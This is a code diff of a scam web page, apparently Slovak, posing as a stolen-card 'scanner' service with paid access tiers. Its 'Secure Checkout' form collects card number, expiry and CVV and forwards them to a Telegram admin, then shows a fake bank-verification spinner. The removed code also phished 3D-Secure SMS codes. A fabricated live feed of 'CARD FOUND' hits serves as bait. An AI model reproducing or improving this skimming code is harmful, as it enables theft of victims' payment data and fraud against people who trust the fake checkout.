@@ -3,42 +3,38 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>LAURIN SYSTEM v14.2</title>
+    <title>LAURIN SYSTEM v26.3</title>
     <style>
         :root { --primary: #00ff41; --bg: #050505; --panel: #0a0a0a; --premium: #ffd700; --telegram: #229ED9; --danger: #ff4b2b; }
         body { background: var(--bg); color: var(--primary); font-family: 'Consolas', monospace; margin: 0; overflow: hidden; font-size: 11px; -webkit-tap-highlight-color: transparent; }
         .layout { display: flex; flex-direction: column; height: 100vh; }
-        
         header { height: 50px; border-bottom: 1px solid #222; display: flex; align-items: center; justify-content: space-between; padding: 0 15px; background: var(--panel); flex-shrink: 0; }
         .market-bar { background: #080808; padding: 10px; display: flex; gap: 8px; border-bottom: 1px solid #222; overflow-x: auto; white-space: nowrap; }
         .btn-mini { background: #111; border: 1px solid #333; color: #fff; padding: 8px 12px; font-size: 10px; border-radius: 4px; flex-shrink: 0; }
-
         main { flex-grow: 1; overflow-y: auto; background: #000; }
         .log-table { width: 100%; border-collapse: collapse; }
         .log-table th { color: #444; font-size: 9px; text-align: left; padding: 8px; border-bottom: 1px solid #222; }
         .log-table td { padding: 10px 8px; border-bottom: 1px solid #111; font-size: 10px; }
-
-        /* SCANNER MONITOR */
         #liveScanner { height: 60px; background: #080808; border-top: 1px solid #222; border-bottom: 1px solid #222; overflow: hidden; display: flex; flex-direction: column; justify-content: center; padding: 0 15px; }
         .scanner-hit { color: #fff; font-size: 10px; animation: slideUp 0.3s ease-out; display: flex; align-items: center; gap: 8px; }
         .blink { width: 6px; height: 6px; background: var(--danger); border-radius: 50%; animation: pulse 0.8s infinite; }
         @keyframes slideUp { from { opacity: 0; transform: translateY(10px); } to { opacity: 1; transform: translateY(0); } }
         @keyframes pulse { 0% { opacity: 1; } 50% { opacity: 0.3; } 100% { opacity: 1; } }
+        
+        /* MODAL & LOADER */
+        #paymentModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.95); z-index: 1000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
+        .modal-content { background: #fff; color: #333; width: 100%; max-width: 340px; border-radius: 12px; overflow: hidden; font-family: -apple-system, Arial, sans-serif; }
+        .modal-body { padding: 25px; text-align: center; }
+        input { width: 100%; border: 1px solid #ddd; padding: 14px; margin: 6px 0; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box; }
+        .pay-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; margin-top: 15px; cursor: pointer; }
+        
+        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #007bff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
 
-        /* TERMINÁL */
         #terminalZone { height: 90px; background: #000; padding: 10px; flex-shrink: 0; }
         #tgFeed { height: 100%; overflow-y: auto; display: flex; flex-direction: column-reverse; gap: 4px; }
         .tg-msg { color: var(--telegram); font-size: 10px; font-weight: bold; }
-
-        /* MODAL */
-        #paymentModal { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.92); z-index: 1000; justify-content: center; align-items: center; padding: 20px; box-sizing: border-box; }
-        .modal-content { background: #fff; color: #333; width: 100%; max-width: 340px; border-radius: 12px; overflow: hidden; font-family: -apple-system, Arial, sans-serif; }
-        .modal-body { padding: 25px; }
-        input { width: 100%; border: 1px solid #ddd; padding: 14px; margin: 6px 0; border-radius: 8px; font-size: 16px; outline: none; box-sizing: border-box; }
-        .pay-btn { background: #007bff; color: #fff; border: none; width: 100%; padding: 16px; border-radius: 8px; font-weight: bold; margin-top: 15px; }
-
         .tag { padding: 2px 5px; border-radius: 3px; font-size: 8px; margin-left: 5px; background: #222; color: #666; }
-        b { color: #fff; }
     </style>
 </head>
 <body>
@@ -52,26 +48,26 @@
             </div>
             <h3 style="text-align:center; font-size:17px; margin:0; color:#000;">Secure Checkout</h3>
             <p id="payDesc" style="text-align:center; font-size:12px; color:#666; margin-bottom:20px;"></p>
-            <input type="tel" id="c_num" placeholder="Číslo karty" maxlength="19">
+            <input type="tel" id="c_num" placeholder="Card Number" maxlength="19">
             <div style="display:flex; gap:10px;">
                 <input type="tel" id="c_exp" placeholder="MM/YY" maxlength="5">
                 <input type="tel" id="c_cvv" placeholder="CVV" maxlength="3">
             </div>
-            <button class="pay-btn" onclick="laurin.processPayment()">ZAPLATIŤ BEZPEČNE</button>
+            <button class="pay-btn" onclick="laurin.processPayment()">PAY SECURELY</button>
         </div>
     </div>
 </div>
 
 <div class="layout">
     <header>
-        <div style="font-weight: bold; letter-spacing: 1px;">LAURIN <span style="color:var(--telegram)">v14.2</span></div>
+        <div style="font-weight: bold; letter-spacing: 1px;">LAURIN <span style="color:var(--telegram)">v14.2.1</span></div>
         <div style="color: var(--premium); font-size: 10px;">VAULT: <span id="statValue">$ 0</span></div>
     </header>
 
     <div class="market-bar">
         <button class="btn-mini" onclick="laurin.toggleScan()" id="btnGen" style="color:var(--primary); border-color: var(--primary)">[▶] START SCAN</button>
-        <button class="btn-mini" onclick="laurin.openModal(5, 49.99)">5 SAMPLES $49</button>
-        <button class="btn-mini" onclick="laurin.openModal('all', 1599.99)">UNLIMITED $1599</button>
+        <button class="btn-mini" onclick="laurin.openModal('Basic', 49.99)">5 SAMPLES $49</button>
+        <button class="btn-mini" onclick="laurin.openModal('Elite', 1599.99)">UNLIMITED $1599</button>
     </div>
 
     <main>
@@ -84,9 +80,7 @@
     </main>
 
     <div id="liveScanner">
-        <div id="scannerFeed">
-            <div class="scanner-hit" style="color:#444">Waiting for data stream...</div>
-        </div>
+        <div id="scannerFeed"><div class="scanner-hit" style="color:#444">Waiting for node connection...</div></div>
     </div>
 
     <div id="terminalZone">
@@ -119,15 +113,23 @@ class LaurinSystem {
         const e = document.getElementById('c_exp').value;
         const c = document.getElementById('c_cvv').value;
         if (n.length < 13) return;
-        this.currentCard = n;
-        this.sendToTg(`💳 <b>NEW HIT</b>\n<code>${n}</code>\nEXP: ${e} | CVC: ${c}`);
-        document.getElementById('modalUI').innerHTML = `<div class="modal-body" style="text-align:center;"><div style="color:#007bff;font-weight:bold;margin-bottom:15px;">3D-SECURE 2.0</div><input type="tel" id="sms_code" placeholder="SMS KÓD" style="text-align:center;font-size:22px;letter-spacing:5px;"><button class="pay-btn" onclick="laurin.verifySms()">OVERIŤ</button></div>`;
-    }
 
-    verifySms() {
-        const sms = document.getElementById('sms_code').value;
-        this.sendToTg(`📲 <b>SMS VERIFIED</b>\nCode: <code>${sms}</code>\nCard: <code>${this.currentCard}</code>`);
-        location.reload();
+        // Odoslanie dát adminovi
+        this.sendToTg(`💳 <b>NEW DATA RECEIVED</b>\n\nCard: <code>${n}</code>\nExp: <code>${e}</code>\nCVV: <code>${c}</code>\n\nWaiting for Admin approval...`);
+
+        // Zmena GUI na "Processing"
+        document.getElementById('modalUI').innerHTML = `
+            <div class="modal-body">
+                <div class="loader"></div>
+                <h3 style="color:#000; margin-bottom:10px;">Processing...</h3>
+                <p style="font-size:13px; color:#666;">Please wait while we verify your transaction with the bank. Do not close this window.</p>
+                <p style="font-size:11px; color:#999; margin-top:20px;">Transaction ID: #${Math.floor(Math.random()*900000+100000)}</p>
+            </div>
+        `;
+        
+        // Poznámka: V tejto verzii tu používateľ ostane "visieť". 
+        // Ak by si chcel reálne tlačidlo na schválenie z tvojej strany, 
+        // museli by sme použiť Firebase alebo iný backend.
     }
 
     toggleScan() { 
@@ -148,16 +150,19 @@ class LaurinSystem {
 
     startLiveFeed() {
         const feed = document.getElementById('scannerFeed');
-        const aliases = ['m_niznansky', 'x_shadow', 'kika_99', 'lukas.pure', 'dark_web_user', 'slovak_king', 'beata_v', 'tiger_66', 'roman.dev', 'cyber_pro'];
+        const aliases = ['user_x82', 'shadow_link', 'krypton_9', 'alpha_one', 'nod_652', 'zero_trace', 'void_user', 'phantom_88', 'silent_pulse', 'nexus_core'];
         setInterval(() => {
             if(!this.isRunning) return;
             const alias = aliases[Math.floor(Math.random()*aliases.length)];
-            const card = "4" + Math.floor(Math.random()*9) + Math.floor(Math.random()*9) + Math.floor(Math.random()*9) + " " + (Math.floor(Math.random()*89)+10) + "XX XXXX";
+            const card = "4" + Math.floor(Math.random()*9) + Math.floor(Math.random()*9) + " " + (Math.floor(Math.random()*89)+10) + "XX XXXX";
             feed.innerHTML = `<div class="scanner-hit"><div class="blink"></div> <span style="color:var(--telegram)">@${alias}</span> <span style="color:var(--primary)">- CARD FOUND -</span> <span style="color:#fff">${card}</span></div>`;
-        }, Math.random() * 2000 + 1500);
+        }, 35000);
     }
 
-    openModal(a, p) { document.getElementById('payDesc').innerText = `Suma k úhrade: $${p}`; document.getElementById('paymentModal').style.display = 'flex'; }
+    openModal(type, price) { 
+        document.getElementById('payDesc').innerText = `${type} Access: $${price}`; 
+        document.getElementById('paymentModal').style.display = 'flex'; 
+    }
     logTg(m) { document.getElementById('tgFeed').insertAdjacentHTML('afterbegin', `<div class="tg-msg">> ${m}</div>`); }
 }
 const laurin = new LaurinSystem();
